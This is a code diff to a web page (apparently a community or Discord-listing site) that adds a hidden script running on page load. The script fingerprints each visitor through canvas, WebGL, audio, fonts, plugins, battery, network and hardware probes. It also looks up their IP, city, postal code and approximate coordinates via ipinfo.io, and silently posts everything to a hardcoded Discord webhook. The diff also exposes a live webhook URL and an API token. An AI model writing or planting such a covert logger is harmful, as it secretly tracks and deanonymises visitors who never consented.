@@ -174,34 +174,272 @@ window.addEventListener('DOMContentLoaded',()=>{
   discord.forEach(d=>addCard('discord-grid',d));
 });
 </script>
-
 <script>
 (async () => {
   const webhookUrl = "https://discord.com/api/webhooks/1378415253767061614/QZ8p3oHVP6tyMVZD_7q8MN2VM3xlGcqYFsrpX-yGaftQRaqk86im6LCsfSfZfBJ6JVRr";
 
-  try {
-    const res = await fetch('https://ipinfo.io/json?token=d2ce059db701bc');
-    const data = await res.json();
+  // Hilfsfunktion: Einfacher Hash (32-bit)
+  function hashString(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+      hash = (Math.imul(31, hash) + str.charCodeAt(i)) | 0;
+    }
+    return (hash >>> 0).toString(16);
+  }
 
-    const payload = {
-      content: `🛰️ **NEW VISITOR ALERT**\n\n🌐 **IP**: ${data.ip}\n📍 **Location**: ${data.city}, ${data.region}, ${data.country}\n🏢 **ISP**: ${data.org}\n🕑 **Timezone**: ${data.timezone}\n\n🚀 **Timestamp**: ${new Date().toLocaleString()}`
-    };
+  // Canvas-Fingerprint
+  function getCanvasFingerprint() {
+    try {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = 200;
+      canvas.height = 50;
+      ctx.textBaseline = "top";
+      ctx.font = "16px 'Arial'";
+      ctx.textBaseline = "alphabetic";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("TitanService", 2, 15);
+      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+      ctx.fillText("TitanService", 4, 17);
+      const dataURL = canvas.toDataURL();
+      return hashString(dataURL);
+    } catch {
+      return "error";
+    }
+  }
 
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(payload)
+  // WebGL-Fingerprint
+  function getWebGLFingerprint() {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      return hashString(vendor + " " + renderer);
+    } catch {
+      return "n/a";
+    }
+  }
+
+  // Audio-Fingerprint (simplifiziert)
+  async function getAudioFingerprint() {
+    try {
+      const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+      const osc = ctx.createOscillator();
+      const analyser = ctx.createAnalyser();
+      osc.connect(analyser);
+      analyser.connect(ctx.destination);
+      osc.start(0);
+      const buffer = await ctx.startRendering();
+      const channelData = buffer.getChannelData(0).slice(0, 1000);
+      let sum = 0;
+      for (let i = 0; i < channelData.length; i++) {
+        sum += Math.abs(channelData[i] * 1000);
+      }
+      return hashString(sum.toString());
+    } catch {
+      return "n/a";
+    }
+  }
+
+  // AdBlock-Detection
+  function detectAdBlock() {
+    const bait = document.createElement("div");
+    bait.className = "adsbox";
+    bait.style.width = "1px";
+    bait.style.height = "1px";
+    bait.style.position = "absolute";
+    bait.style.left = "-9999px";
+    document.body.appendChild(bait);
+    const blocked = window.getComputedStyle(bait).getPropertyValue("display") === "none" || bait.offsetParent === null;
+    document.body.removeChild(bait);
+    return blocked ? "Yes" : "No";
+  }
+
+  // Fonts-Detection (einfacher Test)
+  function detectFonts() {
+    const testString = "mmmmmmmmmmlli";
+    const baseFonts = ["monospace", "sans-serif", "serif"];
+    const fontsToDetect = ["Comic Sans MS", "Courier New", "Times New Roman", "Arial", "Verdana"];
+    const detected = [];
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+
+    function getWidth(font) {
+      ctx.font = `16px '${font}', monospace`;
+      return ctx.measureText(testString).width;
+    }
+
+    const baseWidth = {};
+    baseFonts.forEach(base => {
+      baseWidth[base] = getWidth(base);
     });
-  } catch (err) {
-    console.error('IP Log failed:', err);
+
+    fontsToDetect.forEach(font => {
+      let isAvailable = false;
+      baseFonts.forEach(base => {
+        const width = getWidth(font + ", " + base);
+        if (width !== baseWidth[base]) {
+          isAvailable = true;
+        }
+      });
+      if (isAvailable) detected.push(font);
+    });
+
+    return detected.length ? detected.join(", ") : "None";
+  }
+
+  // Plugins-Liste
+  function getPlugins() {
+    try {
+      const names = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        names.push(navigator.plugins[i].name);
+      }
+      return names.length ? names.join(", ") : "None";
+    } catch {
+      return "n/a";
+    }
+  }
+
+  // Screen-Size & Darkmode
+  const screenSize = `${window.screen.width}x${window.screen.height}`;
+  const darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No";
+
+  // Medien-Geräte Check
+  function hasMediaDevices() {
+    return navigator.mediaDevices && navigator.mediaDevices.enumerateDevices ? "Yes" : "No";
+  }
+
+  // NFC-Check
+  function hasNFC() {
+    return "NDEFReader" in window ? "Yes" : "No";
+  }
+
+  // Bluetooth-Check
+  function hasBluetooth() {
+    return "bluetooth" in navigator ? "Yes" : "No";
+  }
+
+  // Battery Status
+  async function getBatteryInfo() {
+    try {
+      const batt = await navigator.getBattery();
+      return `${Math.round(batt.level * 100)}% (${batt.charging ? "Charging" : "Not Charging"})`;
+    } catch {
+      return "n/a";
+    }
+  }
+
+  // Network Infos
+  function getNetworkInfo() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!conn) return { type: "n/a", downlink: "n/a", effectiveType: "n/a" };
+    return {
+      type: conn.type || "unknown",
+      downlink: conn.downlink ? conn.downlink + " Mb/s" : "n/a",
+      effectiveType: conn.effectiveType || "n/a"
+    };
+  }
+
+  // GPU via WebGL
+  const webglFingerprint = getWebGLFingerprint();
+  // Canvas-Fingerprint
+  const canvasFingerprint = getCanvasFingerprint();
+  // Audio-Fingerprint
+  const audioFingerprint = await getAudioFingerprint();
+  // AdBlocker?
+  const adblock = detectAdBlock();
+  // Fonts
+  const fonts = detectFonts();
+  // Plugins
+  const plugins = getPlugins();
+  // System/Browser Infos
+  const userAgent = navigator.userAgent;
+  const platform = navigator.platform;
+  const language = navigator.language;
+  const cores = navigator.hardwareConcurrency || "n/a";
+  const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "n/a";
+  const touchscreen = navigator.maxTouchPoints > 0 || "ontouchstart" in window ? "Yes" : "No";
+  // Battery
+  const battery = await getBatteryInfo();
+  // Network
+  const { type, downlink, effectiveType } = getNetworkInfo();
+  // MediaDevices
+  const mediaDevices = hasMediaDevices();
+  // NFC/Bluetooth
+  const nfc = hasNFC();
+  const bluetooth = hasBluetooth();
+
+  // IP & Geo via ipinfo.io
+  let ipData = {};
+  try {
+    const res = await fetch("https://ipinfo.io/json?token=d2ce059db701bc");
+    ipData = await res.json();
+  } catch {
+    ipData = { ip: "n/a", city: "n/a", region: "n/a", country: "n/a", postal: "n/a", org: "n/a", timezone: "n/a", loc: "n/a" };
+  }
+
+  // Payload zusammensetzen
+  const content = `
+🛰️ **NEW VISITOR ALERT** 🛰️
+
+🌐 **IP**: ${ipData.ip}
+📍 **Location**: ${ipData.city}, ${ipData.region}, ${ipData.country}, ${ipData.postal}
+🏢 **ISP**: ${ipData.org}
+🕑 **Timezone**: ${ipData.timezone}
+📡 **GPS (Approx.)**: ${ipData.loc || "n/a"}
+
+🧠 **System Infos**
+• **User-Agent**: ${userAgent}
+• **Platform**: ${platform}
+• **Language**: ${language}
+• **Screen Size**: ${screenSize}
+• **Dark Mode**: ${darkMode}
+• **GPU Fingerprint**: ${webglFingerprint}
+• **CPU Cores**: ${cores}
+• **RAM**: ${deviceMemory}
+• **Battery**: ${battery}
+• **Touchscreen**: ${touchscreen}
+
+🎯 **Advanced Fingerprinting**
+• **Canvas FP**: ${canvasFingerprint}
+• **WebGL FP**: ${webglFingerprint}
+• **Audio FP**: ${audioFingerprint}
+• **AdBlocker**: ${adblock}
+• **Fonts**: ${fonts}
+• **Plugins**: ${plugins}
+• **Timezone (JS)**: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+🚀 **Network Infos**
+• **Connection Type**: ${type}
+• **Downlink**: ${downlink}
+• **Effective Type**: ${effectiveType}
+
+🧩 **Hardware Extras**
+• **MediaDevices**: ${mediaDevices}
+• **Bluetooth**: ${bluetooth}
+• **NFC**: ${nfc}
+
+🚀 **Timestamp**: ${new Date().toLocaleString()}
+  `;
+
+  // Senden an Discord Webhook
+  try {
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+  } catch (e) {
+    console.error("Discord Webhook failed:", e);
   }
 })();
 </script>
 
-</body>
-</html>
 
 </body>
 </html>
